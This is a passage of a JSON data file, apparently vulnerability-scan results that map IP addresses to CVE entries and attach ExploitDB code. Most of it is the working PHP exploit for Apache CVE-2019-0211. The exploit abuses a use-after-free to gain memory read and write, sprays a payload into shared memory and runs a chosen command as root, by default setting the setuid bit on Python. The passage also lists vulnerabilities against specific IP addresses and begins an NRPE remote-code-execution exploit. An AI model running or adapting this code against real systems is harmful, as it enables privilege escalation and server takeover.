way to do that is to replace the string by a timelib_rel_time\r\n# structure of which the first bytes can be reached by the (y, m, d, h, i, s)\r\n# properties of the DateInterval object.\r\n#\r\n# Steps:\r\n# - Create a base object (Z)\r\n# - Add string property (abc) so that sizeof(abc) = sizeof(timelib_rel_time)\r\n# - Create DateInterval object ($place) meant to be unset and filled by another\r\n# - Trigger the UAF by unsetting $y[0], which is still reachable using $this\r\n# - Unset $place: at this point, if we create a new DateInterval object, it will\r\n#   replace $place in memory\r\n# - Create a string ($holder) that fills $place's timelib_rel_time structure\r\n# - Allocate a new DateInterval object: its timelib_rel_time structure will\r\n#   end up in place of abc\r\n# - Now we can control $this->abc's zend_string structure entirely using\r\n#   y, m, d etc.\r\n# - Increase abc's size so that we can read/write memory that comes after it,\r\n#   especially the shared memory block\r\n# - Find out all_buckets' position by finding a memory region that matches the\r\n#   mutex->meth structure\r\n# - Compute the bucket index required to reach the SHM and get an arbitrary\r\n#   function call\r\n# - Scan ap_scoreboard_image->parent[] to find workers' PID and replace the\r\n#   bucket\r\nclass Z implements JsonSerializable\r\n{\r\n\tpublic function jsonSerialize()\r\n\t{\r\n\t\tglobal $y, $addresses, $workers_pids;\r\n\r\n\t\t#\r\n\t\t# Setup memory\r\n\t\t#\r\n        o('Triggering UAF');\r\n\t\to('  Creating room and filling empty spaces');\r\n\r\n\t\t# Fill empty blocks to make sure our allocations will be contiguous\r\n\t\t# I: Since a lot of allocations/deallocations happen before the script\r\n\t\t# is ran, two variables instanciated at the same time might not be\r\n\t\t# contiguous: this can be a problem for a lot of reasons.\r\n\t\t# To avoid this, we instanciate several DateInterval objects. These\r\n\t\t# objects will fill a lot of potentially non-contiguous memory blocks,\r\n\t\t# ensuring we get \"fresh memory\" in upcoming allocations.\r\n\t\t$contiguous = [];\r\n\t\tfor($i=0;$i<10;$i++)\r\n\t\t\t$contiguous[] = new DateInterval('PT1S');\r\n\r\n\t\t# Create some space for our UAF blocks not to get overwritten\r\n\t\t# I: A PHP object is a combination of a lot of structures, such as\r\n\t\t# zval, zend_object, zend_object_handlers, zend_string, etc., which are\r\n\t\t# all allocated, and freed when the object is destroyed.\r\n\t\t# After the UAF is triggered on the object, all the structures that are\r\n\t\t# used to represent it will be marked as free.\r\n\t\t# If we create other variables afterwards, those variables might be\r\n\t\t# allocated in the object's previous memory regions, which might pose\r\n\t\t# problems for the rest of the exploitation.\r\n\t\t# To avoid this, we allocate a lot of objects before the UAF, and free\r\n\t\t# them afterwards. Since PHP's heap is LIFO, when we create other vars,\r\n\t\t# they will take the place of those objects instead of the object we\r\n\t\t# are triggering the UAF on. This means our object is \"shielded\" and\r\n\t\t# we don't have to worry about breaking it.\r\n\t\t$room = [];\r\n\t\tfor($i=0;$i<10;$i++)\r\n\t\t\t$room[] = new Z();\r\n\r\n\t\t# Build string meant to fill old DateInterval's timelib_rel_time\r\n\t\t# I: ptr2str's name is unintuitive here: we just want to allocate a\r\n\t\t# zend_string of size 78.\r\n\t\t$_protector = ptr2str(0, 78);\r\n\r\n\t\to('  Allocating $abc and $p');\r\n\r\n\t\t# Create ABC\r\n\t\t# I: This is the variable we will use to R/W memory afterwards.\r\n\t\t# After we free the Z object, we'll make sure abc is overwritten by a\r\n\t\t# timelib_rel_time structure under our control. The first 8*8 = 64 bytes\r\n\t\t# of this structure can be modified easily, meaning we can change the\r\n\t\t# size of abc. This will allow us to read/write memory after abc.\r\n\t\t$this->abc = ptr2str(0, 79);\r\n\r\n\t\t# Create $p meant to protect $this's blocks\r\n\t\t# I: Right after we trigger the UAF, we will unset $p.\r\n\t\t# This means that the timelib_rel_time structure (TRT) of this object\r\n\t\t# will be freed. We will then allocate a string ($protector) of the same\r\n\t\t# size as TRT. Since PHP's heap is LIFO, the string will take the place\r\n\t\t# of the now-freed TRT in memory.\r\n\t\t# Then, we create a new DateInterval object ($x). From the same\r\n\t\t# assumption, every structure constituting this new object will take the\r\n\t\t# place of the previous structure. Nevertheless, since TRT's memory\r\n\t\t# block has already been replaced by $protector, the new TRT will be put\r\n\t\t# in the next free blocks of the same size, which happens to be $abc\r\n\t\t# (remember, |abc| == |timelib_rel_time|).\r\n\t\t# We now have the following situation: $x is a DateInterval object whose\r\n\t\t# internal TRT structure has the same address as $abc's zend_string.\r\n\t\t$p = new DateInterval('PT1S');\r\n\r\n\t\t#\r\n\t\t# Trigger UAF\r\n\t\t#\r\n\t\t\r\n\t\to('  Unsetting both variables and setting $protector');\r\n\t\t# UAF here, $this is usable despite being freed\r\n\t\tunset($y[0]);\r\n\t\t# Protect $this's freed blocks\r\n\t\tunset($p);\r\n\r\n\t\t# Protect $p's timelib_rel_time structure\r\n\t\t$protector = \".$_protector\";\r\n\t\t# !!! This is only required for apache\r\n\t\t# Got no idea as to why there is an extra deallocation (?)\r\n\t\t$room[] = \"!$_protector\";\r\n\r\n\t\to('  Creating DateInterval object');\r\n\t\t# After this line:\r\n\t\t# &((php_interval_obj) x).timelib_rel_time == ((zval) abc).value.str\r\n\t\t# We can control the structure of $this->abc and therefore read/write\r\n\t\t# anything that comes after it in memory by changing its size and\r\n\t\t# making in-place edits using $this->abc[$position] = $char\r\n\t\t$x = new DateInterval('PT1S');\r\n\t\t# zend_string.refcount = 0\r\n\t\t# It will get incremented at some point, and if it is > 1,\r\n\t\t# zend_assign_to_string_offset() will try to duplicate it before making\r\n\t\t# the in-place replacement\r\n\t\t$x->y = 0x00;\r\n\t\t# zend_string.len\r\n\t\t$x->d = 0x100;\r\n\t\t# zend_string.val[0-4]\r\n\t\t$x->h = 0x13121110;\r\n\r\n\t\t# Verify UAF was successful\r\n\t\t# We modified stuff via $x; they should be visible by $this->abc, since\r\n\t\t# they are at the same memory location.\r\n\t\tif(!(\r\n\t\t\tstrlen($this->abc) === $x->d &&\r\n\t\t\t$this->abc[0] == \"\\x10\" &&\r\n\t\t\t$this->abc[1] == \"\\x11\" &&\r\n\t\t\t$this->abc[2] == \"\\x12\" &&\r\n\t\t\t$this->abc[3] == \"\\x13\"\r\n\t\t))\r\n\t\t{\r\n\t\t\to('UAF failed, exiting.');\r\n\t\t\texit();\r\n\t\t}\r\n\t\to('UAF successful.');\r\n\t\to('');\r\n\r\n\t\t# Give us some room\r\n\t\t# I: As indicated before, just unset a lot of stuff so that next allocs\r\n\t\t# don't break our fragile UAFd structure.\r\n\t\tunset($room);\r\n\r\n\t\t#\r\n\t\t# Setup the R/W primitive\r\n\t\t#\r\n\r\n\t\t# We control $abc's internal zend_string structure, therefore we can R/W\r\n\t\t# the shared memory block (SHM), but for that we need to know the\r\n\t\t# position of $abc in memory\r\n\t\t# I: We know the absolute position of the SHM, so we need to need abc's\r\n\t\t# as well, otherwise we cannot compute the offset\r\n\r\n\t\t# Assuming the allocation was contiguous, memory looks like this, with\r\n\t\t# 0x70-sized fastbins:\r\n\t\t# \t[zend_string:abc]\r\n\t\t# \t[zend_string:protector]\r\n\t\t# \t[FREE#1]\r\n\t\t# \t[FREE#2]\r\n\t\t# Therefore, the address of the 2nd free block is in the first 8 bytes\r\n\t\t# of the first block: 0x70 * 2 - 24\r\n\t\t$address = str2ptr($this->abc, 0x70 * 2 - 24);\r\n\t\t# The address we got points to FREE#2, hence we're |block| * 3 higher in\r\n\t\t# memory\r\n\t\t$address = $address - 0x70 * 3;\r\n\t\t# The beginning of the string is 24 bytes after its origin\r\n\t\t$address = $address + 24;\r\n\t\to('Address of $abc: 0x' . dechex($address));\r\n\t\to('');\r\n\r\n\t\t# Compute the size required for our string to include the whole SHM and\r\n\t\t# apache's memory region\r\n\t\t$distance = \r\n\t\t\tmax($addresses['apache'][1], $addresses['shm'][1]) -\r\n\t\t\t$address\r\n\t\t;\r\n\t\t$x->d = $distance;\r\n\r\n\t\t# We can now read/write in the whole SHM and apache's memory region.\r\n\r\n\t\t#\r\n\t\t# Find all_buckets in memory\r\n\t\t#\r\n\r\n\t\t# We are looking for a structure s.t.\r\n\t\t# |all_buckets, mutex| = 0x10\r\n\t\t# |mutex, meth| = 0x8\r\n\t\t# all_buckets is in apache's memory region\r\n\t\t# mutex is in apache's memory region\r\n\t\t# meth is in libaprR's memory region\r\n\t\t# meth's function pointers are in libaprX's memory region\r\n\t\to('Looking for all_buckets in memory');\r\n\t\t$all_buckets = 0;\r\n\r\n\t\tfor(\r\n\t\t\t$i = $addresses['apache'][0] + 0x10;\r\n\t\t\t$i < $addresses['apache'][1] - 0x08;\r\n\t\t\t$i += 8\r\n\t\t)\r\n\t\t{\r\n\t\t\t# mutex\r\n\t\t\t$mutex = $pointer = str2ptr($this->abc, $i - $address);\r\n\t\t\tif(!in($pointer, $addresses['apache']))\r\n\t\t\t\tcontinue;\r\n\r\n\r\n\t\t\t# meth\r\n\t\t\t$meth = $pointer = str2ptr($this->abc, $pointer + 0x8 - $address);\r\n\t\t\tif(!in($pointer, $addresses['libaprR']))\r\n\t\t\t\tcontinue;\r\n\r\n\t\t\to('  [&mutex]: 0x' . dechex($i));\r\n\t\t\to('    [mutex]: 0x' . dechex($mutex));\r\n\t\t\to('      [meth]: 0x' . dechex($meth));\r\n\r\n\r\n\t\t\t# meth->*\r\n\t\t\t# flags\r\n\t\t\tif(str2ptr($this->abc, $pointer - $address) != 0)\r\n\t\t\t\tcontinue;\r\n\t\t\t# methods\r\n\t\t\tfor($j=0;$j<7;$j++)\r\n\t\t\t{\r\n\t\t\t\t$m = str2ptr($this->abc, $pointer + 0x8 + $j * 8 - $address);\r\n\t\t\t\tif(!in($m, $addresses['libaprX']))\r\n\t\t\t\t\tcontinue 2;\r\n\t\t\t\to('        [*]: 0x' . dechex($m));\r\n\t\t\t}\r\n\r\n\t\t\t$all_buckets = $i - 0x10;\r\n\t\t\to('all_buckets = 0x' . dechex($all_buckets));\r\n\t\t\tbreak;\r\n\t\t}\r\n\r\n\t\tif(!$all_buckets)\r\n\t\t{\r\n\t\t\to('Unable to find all_buckets');\r\n\t\t\texit();\r\n\t\t}\r\n\r\n\t\to('');\r\n\r\n\t\t# The address of all_buckets will change when apache is gracefully\r\n\t\t# restarted. This is a problem because we need to know all_buckets's\r\n\t\t# address in order to make all_buckets[some_index] point to a memory\r\n\t\t# region we control.\r\n\r\n\t\t#\r\n\t\t# Compute potential bucket indexes and their addresses\r\n\t\t#\r\n\r\n        o('Computing potential bucket indexes and addresses');\r\n\r\n\t\t# Since we have sizeof($workers_pid) MPM workers, we can fill the rest\r\n\t\t# of the ap_score_image->servers items, so 256 - sizeof($workers_pids),\r\n\t\t# with data we like. We keep the one at the top to store our payload.\r\n\t\t# The rest is sprayed with the address of our payload.\r\n\r\n\t\t$size_prefork_child_bucket = 24;\r\n\t\t$size_worker_score = 264;\r\n\t\t# I get strange errors if I use every \"free\" item, so I leave twice as\r\n\t\t# many items free. I'm guessing upon startup some\r\n\t\t$spray_size = $size_worker_score * (256 - sizeof($workers_pids) * 2);\r\n\t\t$spray_max = $addresses['shm'][1];\r\n\t\t$spray_min = $spray_max - $spray_size;\r\n\r\n\t\t$spray_middle = (int) (($spray_min + $spray_max) / 2);\r\n\t\t$bucket_index_middle = (int) (\r\n\t\t\t- ($all_buckets - $spray_middle) /\r\n\t\t\t$size_prefork_child_bucket\r\n\t\t);\r\n\r\n\t\t#\r\n\t\t# Build payload\r\n\t\t#\r\n\r\n\t\t# A worker_score structure was kept empty to put our payload in\r\n\t\t$payload_start = $spray_min - $size_worker_score;\r\n\r\n\t\t$z = ptr2str(0);\r\n\r\n    \t# Payload maxsize 264 - 112 = 152\r\n\t\t# Offset 8 cannot be 0, but other than this you can type whatever\r\n\t\t# command you want\r\n    \t$bucket = isset($_REQUEST['cmd']) ?\r\n    \t\t$_REQUEST['cmd'] :\r\n    \t\t\"chmod +s /usr/bin/python3.5\";\r\n\r\n    \tif(strlen($bucket) > $size_worker_score - 112)\r\n\t\t{\r\n\t\t\to(\r\n\t\t\t\t'Payload size is bigger than available space (' .\r\n\t\t\t\t($size_worker_score - 112) .\r\n\t\t\t\t'), exiting.'\r\n\t\t\t);\r\n\t\t\texit();\r\n\t\t}\r\n    \t# Align\r\n    \t$bucket = str_pad($bucket, $size_worker_score - 112, \"\\x00\");\r\n\r\n    \t# apr_proc_mutex_unix_lock_methods_t\r\n\t\t$meth = \r\n\t\t    $z .\r\n\t\t    $z .\r\n\t\t    $z .\r\n\t\t    $z .\r\n\t\t    $z .\r\n\t\t    $z .\r\n\t\t\t# child_init\r\n\t\t    ptr2str($addresses['zend_object_std_dtor'])\r\n\t\t;\r\n\r\n\t\t# The second pointer points to meth, and is used before reaching the\r\n\t\t# arbitrary function call\r\n\t\t# The third one and the last one are both used by the function call\r\n\t\t# zend_object_std_dtor(object) => ... => system(&arData[0]->val)\r\n\t\t$properties = \r\n\t\t\t# refcount\r\n\t\t\tptr2str(1) .\r\n\t\t\t# u-nTableMask meth\r\n\t\t\tptr2str($payload_start + strlen($bucket)) .\r\n\t\t\t# Bucket arData\r\n\t\t\tptr2str($payload_start) .\r\n\t\t\t# uint32_t nNumUsed;\r\n\t\t\tptr2str(1, 4) .\r\n\t\t    # uint32_t nNumOfElements;\r\n\t\t\tptr2str(0, 4) .\r\n\t\t\t# uint32_t nTableSize\r\n\t\t\tptr2str(0, 4) .\r\n\t\t\t# uint32_t nInternalPointer\r\n\t\t\tptr2str(0, 4) .\r\n\t\t\t# zend_long nNextFreeElement\r\n\t\t\t$z .\r\n\t\t\t# dtor_func_t pDestructor\r\n\t\t\tptr2str($addresses['system'])\r\n\t\t;\r\n\r\n\t\t$payload =\r\n\t\t\t$bucket .\r\n\t\t\t$meth .\r\n\t\t\t$properties\r\n\t\t;\r\n\r\n\t\t# Write the payload\r\n\r\n\t\to('Placing payload at address 0x' . dechex($payload_start));\r\n\r\n\t\t$p = $payload_start - $address;\r\n\t\tfor(\r\n\t\t\t$i = 0;\r\n\t\t\t$i < strlen($payload);\r\n\t\t\t$i++\r\n\t\t)\r\n\t\t{\r\n\t\t\t$this->abc[$p+$i] = $payload[$i];\r\n\t\t}\r\n\r\n\t\t# Fill the spray area with a pointer to properties\r\n\t\t\r\n\t\t$properties_address = $payload_start + strlen($bucket) + strlen($meth);\r\n\t\to('Spraying pointer');\r\n\t\to('  Address: 0x' . dechex($properties_address));\r\n\t\to('  From: 0x' . dechex($spray_min));\r\n\t\to('  To: 0x' . dechex($spray_max));\r\n\t\to('  Size: 0x' . dechex($spray_size));\r\n\t\to('  Covered: 0x' . dechex($spray_size * count($workers_pids)));\r\n\t\to('  Apache: 0x' . dechex(\r\n\t\t\t$addresses['apache'][1] -\r\n\t\t\t$addresses['apache'][0]\r\n\t\t));\r\n\r\n\t\t$s_properties_address = ptr2str($properties_address);\r\n\r\n\t\tfor(\r\n\t\t\t$i = $spray_min;\r\n\t\t\t$i < $spray_max;\r\n\t\t\t$i++\r\n\t\t)\r\n\t\t{\r\n\t\t\t$this->abc[$i - $address] = $s_properties_address[$i % 8];\r\n\t\t}\r\n\t\to('');\r\n\r\n\t\t# Find workers PID in the SHM: it indicates the beginning of their\r\n\t\t# process_score structure. We can then change process_score.bucket to\r\n\t\t# the index we computed. When apache reboots, it will use\r\n\t\t# all_buckets[ap_scoreboard_image->parent[i]->bucket]->mutex\r\n\t\t# which means we control the whole apr_proc_mutex_t structure.\r\n\t\t# This structure contains pointers to multiple functions, especially\r\n\t\t# mutex->meth->child_init(), which will be called before privileges\r\n\t\t# are dropped.\r\n\t\t# We do this for every worker PID, incrementing the bucket index so that\r\n\t\t# we cover a bigger range.\r\n\t\t\r\n\t\to('Iterating in SHM to find PIDs...');\r\n\r\n\t\t# Number of bucket indexes covered by our spray\r\n\t\t$spray_nb_buckets = (int) ($spray_size / $size_prefork_child_bucket);\r\n\t\t# Number of bucket indexes covered by our spray and the PS structures\r\n\t\t$total_nb_buckets = $spray_nb_buckets * count($workers_pids);\r\n\t\t# First bucket index to handle\r\n\t\t$bucket_index = $bucket_index_middle - (int) ($total_nb_buckets / 2);\r\n\r\n\t\t# Iterate over every process_score structure until we find every PID or\r\n\t\t# we reach the end of the SHM\r\n\t\tfor(\r\n\t\t\t$p = $addresses['shm'][0] + 0x20;\r\n\t\t\t$p < $addresses['shm'][1] && count($workers_pids) > 0;\r\n\t\t\t$p += 0x24\r\n\t\t)\r\n\t\t{\r\n\t\t\t$l = $p - $address;\r\n\t\t\t$current_pid = str2ptr($this->abc, $l, 4);\r\n\t\t\to('Got PID: ' . $current_pid);\r\n\t\t\t# The PID matches one of the workers\r\n\t\t\tif(in_array($current_pid, $workers_pids))\r\n\t\t\t{\r\n\t\t\t\tunset($workers_pids[$current_pid]);\r\n\t\t\t\to('  PID matches');\r\n\t\t\t\t# Update bucket address\r\n\t\t\t\t$s_bucket_index = pack('l', $bucket_index);\r\n\t\t\t\t$this->abc[$l + 0x20] = $s_bucket_index[0];\r\n\t\t\t\t$this->abc[$l + 0x21] = $s_bucket_index[1];\r\n\t\t\t\t$this->abc[$l + 0x22] = $s_bucket_index[2];\r\n\t\t\t\t$this->abc[$l + 0x23] = $s_bucket_index[3];\r\n\t\t\t\to('  Changed bucket value to ' . $bucket_index);\r\n\t\t\t\t$min = $spray_min - $size_prefork_child_bucket * $bucket_index;\r\n\t\t\t\t$max = $spray_max - $size_prefork_child_bucket * $bucket_index;\r\n\t\t\t\to('  Ranges: 0x' . dechex($min) . ' - 0x' . dechex($max));\r\n\t\t\t\t# This bucket range is covered, go to the next one\r\n\t\t\t\t$bucket_index += $spray_nb_buckets;\r\n\t\t\t}\r\n\t\t}\r\n\r\n\t\tif(count($workers_pids) > 0)\r\n\t\t{\r\n\t\t\to(\r\n\t\t\t\t'Unable to find PIDs ' .\r\n\t\t\t\timplode(', ', $workers_pids) .\r\n\t\t\t\t' in SHM, exiting.'\r\n\t\t\t);\r\n\t\t\texit();\r\n\t\t}\r\n\r\n\t\to('');\r\n\t\to('EXPLOIT SUCCESSFUL.');\r\n\t\to('Await 6:25AM.');\r\n\t\t\r\n\t\treturn 0;\r\n\t}\r\n}\r\n\r\nfunction o($msg)\r\n{\r\n\t# No concatenation -> no string allocation\r\n\tprint($msg);\r\n\tprint(\"\\n\");\r\n}\r\n\r\nfunction ptr2str($ptr, $m=8)\r\n{\r\n\t$out = \"\";\r\n    for ($i=0; $i<$m; $i++)\r\n    {\r\n        $out .= chr($ptr & 0xff);\r\n        $ptr >>= 8;\r\n    }\r\n    return $out;\r\n}\r\n\r\nfunction str2ptr(&$str, $p, $s=8)\r\n{\r\n\t$address = 0;\r\n\tfor($j=$s-1;$j>=0;$j--)\r\n\t{\r\n\t\t$address <<= 8;\r\n\t\t$address |= ord($str[$p+$j]);\r\n\t}\r\n\treturn $address;\r\n}\r\n\r\nfunction in($i, $range)\r\n{\r\n\treturn $i >= $range[0] && $i < $range[1];\r\n}\r\n\r\n/**\r\n * Finds the offset of a symbol in a file.\r\n */\r\nfunction find_symbol($file, $symbol)\r\n{\r\n    $elf = file_get_contents($file);\r\n    $e_shoff = str2ptr($elf, 0x28);\r\n    $e_shentsize = str2ptr($elf, 0x3a, 2);\r\n    $e_shnum = str2ptr($elf, 0x3c, 2);\r\n\r\n    $dynsym_off = 0;\r\n    $dynsym_sz = 0;\r\n    $dynstr_off = 0;\r\n\r\n    for($i=0;$i<$e_shnum;$i++)\r\n    {\r\n        $offset = $e_shoff + $i * $e_shentsize;\r\n        $sh_type = str2ptr($elf, $offset + 0x04, 4);\r\n\r\n        $SHT_DYNSYM = 11;\r\n        $SHT_SYMTAB = 2;\r\n        $SHT_STRTAB = 3;\r\n\r\n        switch($sh_type)\r\n        {\r\n            case $SHT_DYNSYM:\r\n                $dynsym_off = str2ptr($elf, $offset + 0x18, 8);\r\n                $dynsym_sz = str2ptr($elf, $offset + 0x20, 8);\r\n                break;\r\n            case $SHT_STRTAB:\r\n            case $SHT_SYMTAB:\r\n                if(!$dynstr_off)\r\n                    $dynstr_off = str2ptr($elf, $offset + 0x18, 8);\r\n                break;\r\n        }\r\n\r\n    }\r\n\r\n    if(!($dynsym_off && $dynsym_sz && $dynstr_off))\r\n        exit('.');\r\n\r\n    $sizeof_Elf64_Sym = 0x18;\r\n\r\n    for($i=0;$i * $sizeof_Elf64_Sym < $dynsym_sz;$i++)\r\n    {\r\n        $offset = $dynsym_off + $i * $sizeof_Elf64_Sym;\r\n        $st_name = str2ptr($elf, $offset, 4);\r\n        \r\n        if(!$st_name)\r\n            continue;\r\n        \r\n        $offset_string = $dynstr_off + $st_name;\r\n        $end = strpos($elf, \"\\x00\", $offset_string) - $offset_string;\r\n        $string = substr($elf, $offset_string, $end);\r\n\r\n        if($string == $symbol)\r\n        {\r\n            $st_value = str2ptr($elf, $offset + 0x8, 8);\r\n            return $st_value;\r\n        }\r\n    }\r\n\r\n    die('Unable to find symbol ' . $symbol);\r\n}\r\n\r\n# Obtains the addresses of the shared memory block and some functions through \r\n# /proc/self/maps\r\n# This is hacky as hell.\r\nfunction get_all_addresses()\r\n{\r\n\t$addresses = [];\r\n\t$data = file_get_contents('/proc/self/maps');\r\n\t$follows_shm = false;\r\n\r\n\tforeach(explode(\"\\n\", $data) as $line)\r\n\t{\r\n\t\tif(!isset($addresses['shm']) && strpos($line, '/dev/zero'))\r\n\t\t{\r\n            $line = explode(' ', $line)[0];\r\n            $bounds = array_map('hexdec', explode('-', $line));\r\n            if ($bounds[1] - $bounds[0] == 0x14000)\r\n            {\r\n                $addresses['shm'] = $bounds;\r\n                $follows_shm = true;\r\n            }\r\n        }\r\n\t\tif(\r\n\t\t\tpreg_match('#(/[^\\s]+libc-[0-9.]+.so[^\\s]*)#', $line, $matches) &&\r\n\t\t\tstrpos($line, 'r-xp')\r\n\t\t)\r\n\t\t{\r\n\t\t\t$offset = find_symbol($matches[1], 'system');\r\n\t\t\t$line = explode(' ', $line)[0];\r\n\t\t\t$line = hexdec(explode('-', $line)[0]);\r\n\t\t\t$addresses['system'] = $line + $offset;\r\n\t\t}\r\n\t\tif(\r\n\t\t\tstrpos($line, 'libapr-1.so') &&\r\n\t\t\tstrpos($line, 'r-xp')\r\n\t\t)\r\n\t\t{\r\n\t\t\t$line = explode(' ', $line)[0];\r\n\t\t\t$bounds = array_map('hexdec', explode('-', $line));\r\n\t\t\t$addresses['libaprX'] = $bounds;\r\n\t\t}\r\n\t\tif(\r\n\t\t\tstrpos($line, 'libapr-1.so') &&\r\n\t\t\tstrpos($line, 'r--p')\r\n\t\t)\r\n\t\t{\r\n\t\t\t$line = explode(' ', $line)[0];\r\n\t\t\t$bounds = array_map('hexdec', explode('-', $line));\r\n\t\t\t$addresses['libaprR'] = $bounds;\r\n\t\t}\r\n\t\t# Apache's memory block is between the SHM and ld.so\r\n\t\t# Sometimes some rwx region gets mapped; all_buckets cannot be in there\r\n\t\t# but we include it anyways for the sake of simplicity\r\n\t\tif(\r\n\t\t\t(\r\n\t\t\t\tstrpos($line, 'rw-p') ||\r\n\t\t\t\tstrpos($line, 'rwxp')\r\n\t\t\t) &&\r\n            $follows_shm\r\n\t\t)\r\n\t\t{\r\n            if(strpos($line, '/lib'))\r\n            {\r\n                $follows_shm = false;\r\n                continue;\r\n            }\r\n\t\t\t$line = explode(' ', $line)[0];\r\n\t\t\t$bounds = array_map('hexdec', explode('-', $line));\r\n\t\t\tif(!array_key_exists('apache', $addresses))\r\n\t\t\t    $addresses['apache'] = $bounds;\r\n\t\t\telse if($addresses['apache'][1] == $bounds[0])\r\n                $addresses['apache'][1] = $bounds[1];\r\n\t\t\telse\r\n                $follows_shm = false;\r\n\t\t}\r\n\t\tif(\r\n\t\t\tpreg_match('#(/[^\\s]+libphp7[0-9.]+.so[^\\s]*)#', $line, $matches) &&\r\n\t\t\tstrpos($line, 'r-xp')\r\n\t\t)\r\n\t\t{\r\n\t\t\t$offset = find_symbol($matches[1], 'zend_object_std_dtor');\r\n\t\t\t$line = explode(' ', $line)[0];\r\n\t\t\t$line = hexdec(explode('-', $line)[0]);\r\n\t\t\t$addresses['zend_object_std_dtor'] = $line + $offset;\r\n\t\t}\r\n\t}\r\n\r\n\t$expected = [\r\n\t\t'shm', 'system', 'libaprR', 'libaprX', 'apache', 'zend_object_std_dtor'\r\n\t];\r\n\t$missing = array_diff($expected, array_keys($addresses));\r\n\r\n\tif($missing)\r\n\t{\r\n\t\to(\r\n\t\t\t'The following addresses were not determined by parsing ' .\r\n\t\t\t'/proc/self/maps: ' . implode(', ', $missing)\r\n\t\t);\r\n\t\texit(0);\r\n\t}\r\n\r\n\r\n\to('PID: ' . getmypid());\r\n\to('Fetching addresses');\r\n\r\n\tforeach($addresses as $k => $a)\r\n\t{\r\n\t\tif(!is_array($a))\r\n\t\t\t$a = [$a];\r\n\t\to('  ' . $k . ': ' . implode('-0x', array_map(function($z) {\r\n\t\t\t\treturn '0x' . dechex($z);\r\n\t\t}, $a)));\r\n\t}\r\n\to('');\r\n\r\n\treturn $addresses;\r\n}\r\n\r\n# Extracts PIDs of apache workers using /proc/*/cmdline and /proc/*/status,\r\n# matching the cmdline and the UID\r\nfunction get_workers_pids()\r\n{\r\n\to('Obtaining apache workers PIDs');\r\n\t$pids = [];\r\n\t$cmd = file_get_contents('/proc/self/cmdline');\r\n\t$processes = glob('/proc/*');\r\n\tforeach($processes as $process)\r\n\t{\r\n\t\tif(!preg_match('#^/proc/([0-9]+)$#', $process, $match))\r\n\t\t\tcontinue;\r\n\t\t$pid = (int) $match[1];\r\n\t\tif(\r\n\t\t\t!is_readable($process . '/cmdline') ||\r\n\t\t\t!is_readable($process . '/status')\r\n\t\t)\r\n\t\t\tcontinue;\r\n\t\tif($cmd !== file_get_contents($process . '/cmdline'))\r\n\t\t\tcontinue;\r\n\r\n\t\t$status = file_get_contents($process . '/status');\r\n\t\tforeach(explode(\"\\n\", $status) as $line)\r\n\t\t{\r\n\t\t\tif(\r\n\t\t\t\tstrpos($line, 'Uid:') === 0 &&\r\n\t\t\t\tpreg_match('#\\b' . posix_getuid() . '\\b#', $line)\r\n\t\t\t)\r\n\t\t\t{\r\n\t\t\t\to('  Found apache worker: ' . $pid);\r\n\t\t\t\t$pids[$pid] = $pid;\r\n\t\t\t\tbreak;\r\n\t\t\t}\r\n\r\n\t\t}\r\n\t}\r\n\t\r\n\to('Got ' . sizeof($pids) . ' PIDs.');\r\n\to('');\r\n\r\n\treturn $pids;\r\n}\r\n\r\n$addresses = get_all_addresses();\r\n$workers_pids = get_workers_pids();\r\nreal();",
                "description": "Apache 2.4.17 < 2.4.38 - 'apache2ctl graceful' 'logrotate' Local Privilege Escalation",
                "author": "cfreal",
                "_id": 46676,
                "source": "ExploitDB",
                "platform": "linux",
                "date": "2019-04-08T00:00:00+00:00",
                "cve": [
                    "CVE-2019-0211",
                    "cve-2019-0211"
                ],
                "type": "local",
                "port": 0
            }
        ],
        "CVE-2017-15710": [
            {
                "source": "CVE",
                "_id": "2017-15710",
                "description": "In Apache httpd 2.0.23 to 2.0.65, 2.2.0 to 2.2.34, and 2.4.0 to 2.4.29, mod_authnz_ldap, if configured with AuthLDAPCharsetConfig, uses the Accept-Language header value to lookup the right charset encoding when verifying the user's credentials. If the header value is not present in the charset conversion table, a fallback mechanism is used to truncate it to a two characters value to allow a quick retry (for example, 'en-US' is truncated to 'en'). A header value of less than two characters forces an out of bound write of one NUL byte to a memory location that is not part of the string. In the worst case, quite unlikely, the process would crash which could be used as a Denial of Service attack. In the more likely case, this memory is already reserved for future use and the issue has no effect at all.",
                "osvdb": [],
                "bid": [
                    103512
                ],
                "cve": [
                    "CVE-2017-15710"
                ],
                "msb": []
            }
        ]
    },
    "152.14.118.251": {
        "CVE-2018-15919": [
            {
                "source": "CVE",
                "_id": "2018-15919",
                "description": "Remotely observable behaviour in auth-gss2.c in OpenSSH through 7.8 could be used by remote attackers to detect existence of users on a target system when GSS2 is in use. NOTE: the discoverer states 'We understand that the OpenSSH developers do not want to treat such a username enumeration (or \"oracle\") as a vulnerability.'",
                "osvdb": [],
                "bid": [
                    105163
                ],
                "cve": [
                    "CVE-2018-15919"
                ],
                "msb": []
            }
        ]
    },
    "152.14.119.56": {
        "CVE-2014-2324": [
            {
                "source": "CVE",
                "_id": "2014-2324",
                "description": "Multiple directory traversal vulnerabilities in (1) mod_evhost and (2) mod_simple_vhost in lighttpd before 1.4.35 allow remote attackers to read arbitrary files via a .. (dot dot) in the host name, related to request_check_hostname.",
                "osvdb": [],
                "bid": [
                    66157
                ],
                "cve": [
                    "CVE-2014-2324"
                ],
                "msb": []
            },
            {
                "code": "#!/usr/bin/python\r\n#\r\n#\r\n# Exploit Title : NRPE <= 2.15 Remote Code Execution Vulnerability\r\n#\r\n# Discovered by  : Dawid Golunski\r\n#                  dawid (at) legalhackers (dot) com\r\n#                  legalhackers.com\r\n#\r\n# Exploit Author : Claudio Viviani\r\n#                  http://www.homelab.it\r\n#\r\n#                  info@homelab.it\r\n#                  homelabit@protonmail.ch\r\n#\r\n#                  https://www.facebook.com/homelabit\r\n#                  https://twitter.com/homelabit\r\n#                  https://plus.google.com/+HomelabIt1/\r\n#                  https://www.youtube.com/channel/UCqqmSdMqf_exicCe_DjlBww\r\n#\r\n#\r\n#\r\n# C crc32 function ripped from check_nrpe_clone by Alan Brenner <alan.brenner@ithaka.org>\r\n#                                       http://www.abcompcons.com/files/nrpe_client.py\r\n#\r\n# pyOpenSSL Library required (http://pyopenssl.sourceforge.net/)\r\n#\r\n# [root@localhost ~]# pip-python install pyOpenSSL\r\n#\r\n# NRPE <= 2.15 Remote Command Execution Vulnerability\r\n# Release date: 17.04.2014\r\n# Discovered by: Dawid Golunski\r\n# Severity: High\r\n# CVE-2014-2913\r\n#\r\n# http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-2913\r\n# 